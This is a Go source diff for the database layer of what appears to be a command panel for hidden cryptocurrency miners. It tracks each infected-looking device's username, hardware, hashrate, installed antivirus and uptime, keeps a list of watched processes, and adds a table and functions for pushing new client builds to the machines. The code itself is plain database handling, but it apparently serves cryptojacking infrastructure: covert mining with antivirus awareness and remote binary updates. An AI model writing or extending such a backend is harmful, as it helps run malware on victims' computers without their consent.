@@ -47,6 +47,7 @@ func (db *DB) createTables() error {
 		gpu_hashrate REAL DEFAULT 0,
 		antivirus_name TEXT,
 		device_uptime_min INTEGER DEFAULT 0,
+		client_version TEXT DEFAULT '2.3.0',
 		status TEXT DEFAULT 'online',
 		last_seen INTEGER,
 		created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -72,7 +73,16 @@ func (db *DB) createTables() error {
 		created_at INTEGER NOT NULL
 	);`
 
-	for _, schema := range []string{minersTable, configTable, usersTable} {
+	updatesTable := `
+	CREATE TABLE IF NOT EXISTS updates (
+		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		version TEXT NOT NULL UNIQUE,
+		filename TEXT NOT NULL,
+		is_current INTEGER DEFAULT 0,
+		uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+	);`
+
+	for _, schema := range []string{minersTable, configTable, usersTable, updatesTable} {
 		if _, err := db.Exec(schema); err != nil {
 			return fmt.Errorf("failed to execute schema: %w", err)
 		}
@@ -80,6 +90,9 @@ func (db *DB) createTables() error {
 
 	// Migrate: add watched_processes column if it doesn't exist yet
 	_, _ = db.Exec(`ALTER TABLE config ADD COLUMN watched_processes TEXT DEFAULT ''`)
+
+	// Migrate: add client_version column if it doesn't exist yet (for existing databases)
+	_, _ = db.Exec(`ALTER TABLE miners ADD COLUMN client_version TEXT DEFAULT '2.3.0'`)
 
 	// Initialize default config if empty
 	var count int
@@ -105,7 +118,7 @@ func (db *DB) createTables() error {
 // GetMiners retrieves all miners
 func (db *DB) GetMiners() ([]models.Miner, error) {
 	rows, err := db.Query(`
-		SELECT id, device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, status, last_seen, created_at
+		SELECT id, device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen, created_at
 		FROM miners
 		ORDER BY last_seen DESC
 	`)
@@ -118,7 +131,7 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 	for rows.Next() {
 		var m models.Miner
 		var createdAt time.Time
-		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.CPUHashRate, &m.GPUHashRate, &m.AntivirusName, &m.DeviceUptimeMin, &m.Status, &m.LastSeen, &createdAt); err != nil {
+		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.CPUHashRate, &m.GPUHashRate, &m.AntivirusName, &m.DeviceUptimeMin, &m.ClientVersion, &m.Status, &m.LastSeen, &createdAt); err != nil {
 			return nil, err
 		}
 		m.CreatedAt = createdAt.Unix()
@@ -131,8 +144,8 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 // UpsertMiner inserts or updates a miner by device_hash
 func (db *DB) UpsertMiner(report *models.MinerReport) error {
 	_, err := db.Exec(`
-		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, status, last_seen)
-		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, cpu_hashrate, gpu_hashrate, antivirus_name, device_uptime_min, client_version, status, last_seen)
+		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
 		ON CONFLICT(device_hash) DO UPDATE SET
 			pc_username = excluded.pc_username,
 			cpu_name = excluded.cpu_name,
@@ -141,9 +154,10 @@ func (db *DB) UpsertMiner(report *models.MinerReport) error {
 			gpu_hashrate = excluded.gpu_hashrate,
 			antivirus_name = excluded.antivirus_name,
 			device_uptime_min = excluded.device_uptime_min,
+			client_version = excluded.client_version,
 			status = 'online',
 			last_seen = excluded.last_seen
-	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName, report.CPUHashrate, report.GPUHashrate, report.AntivirusName, report.DeviceUptimeMin, "online", report.Timestamp)
+	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName, report.CPUHashrate, report.GPUHashrate, report.AntivirusName, report.DeviceUptimeMin, report.ClientVersion, "online", report.Timestamp)
 
 	return err
 }
@@ -263,4 +277,114 @@ func (db *DB) HasAnyUsers() (bool, error) {
 		return false, err
 	}
 	return count > 0, nil
+}
+
+// AddUpdate adds a new client update to the database
+func (db *DB) AddUpdate(version, filename string, isCurrent bool) error {
+	currentVal := 0
+	if isCurrent {
+		// If this is being set as current, unset any previous current
+		_, _ = db.Exec(`UPDATE updates SET is_current = 0`)
+		currentVal = 1
+	}
+
+	_, err := db.Exec(`
+		INSERT INTO updates (version, filename, is_current)
+		VALUES (?, ?, ?)
+	`, version, filename, currentVal)
+
+	return err
+}
+
+// GetUpdates retrieves all updates ordered by upload date (newest first)
+func (db *DB) GetUpdates() ([]map[string]interface{}, error) {
+	rows, err := db.Query(`
+		SELECT id, version, filename, is_current, uploaded_at
+		FROM updates
+		ORDER BY uploaded_at DESC
+	`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var updates []map[string]interface{}
+	for rows.Next() {
+		var id int
+		var version, filename string
+		var isCurrent int
+		var uploadedAt time.Time
+
+		if err := rows.Scan(&id, &version, &filename, &isCurrent, &uploadedAt); err != nil {
+			return nil, err
+		}
+
+		updates = append(updates, map[string]interface{}{
+			"id":          id,
+			"version":     version,
+			"filename":    filename,
+			"is_current":  isCurrent == 1,
+			"uploaded_at": uploadedAt,
+		})
+	}
+
+	return updates, rows.Err()
+}
+
+// SetCurrentUpdate sets a specific update as the current version
+func (db *DB) SetCurrentUpdate(id int) error {
+	_, err := db.Exec(`UPDATE updates SET is_current = 0`)
+	if err != nil {
+		return err
+	}
+
+	_, err = db.Exec(`UPDATE updates SET is_current = 1 WHERE id = ?`, id)
+	return err
+}
+
+// GetCurrentUpdate gets the current/latest version
+func (db *DB) GetCurrentUpdate() (map[string]interface{}, error) {
+	var id int
+	var version, filename string
+	var uploadedAt time.Time
+
+	err := db.QueryRow(`
+		SELECT id, version, filename, uploaded_at
+		FROM updates
+		WHERE is_current = 1
+		LIMIT 1
+	`).Scan(&id, &version, &filename, &uploadedAt)
+
+	if err == sql.ErrNoRows {
+		return nil, nil
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	return map[string]interface{}{
+		"id":          id,
+		"version":     version,
+		"filename":    filename,
+		"uploaded_at": uploadedAt,
+	}, nil
+}
+
+// DeleteUpdate removes an update and its file
+func (db *DB) DeleteUpdate(id int) (string, error) {
+	var filename string
+
+	// Get filename first
+	err := db.QueryRow("SELECT filename FROM updates WHERE id = ?", id).Scan(&filename)
+	if err != nil {
+		return "", err
+	}
+
+	// Delete from database
+	_, err = db.Exec("DELETE FROM updates WHERE id = ?", id)
+	if err != nil {
+		return filename, err
+	}
+
+	return filename, nil
 }
